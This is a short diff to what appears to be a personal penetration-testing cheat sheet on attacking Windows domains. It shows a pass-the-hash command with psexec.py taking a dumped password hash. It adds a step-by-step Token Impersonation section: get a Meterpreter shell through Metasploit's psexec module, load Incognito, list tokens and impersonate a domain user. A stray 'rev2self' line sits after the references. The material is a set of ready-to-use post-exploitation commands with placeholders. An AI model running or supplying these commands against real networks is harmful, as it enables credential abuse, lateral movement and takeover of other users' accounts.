@@ -68,9 +68,16 @@ Gaining Shell using dumped Hashed password
 --------------------------------------------------------
 > psexec.py "<user_name>":@<IP> -hashes <HASH_value>
 
+Token Impersonation using Incognito
+---------------------------------------------------
+1> get meterpreter shell using exploit/windows/smb/psexec
+2> meterpreter > load incognito
+3> list_tokens -u
+4> impersonate_token <DOMAIN>\\<USER>
 
 Usefull refrences
 --------------------------------------------------------------------------------
 https://wadcoms.github.io/#+Shell+Enumeration+Windows
 
+rev2self
 
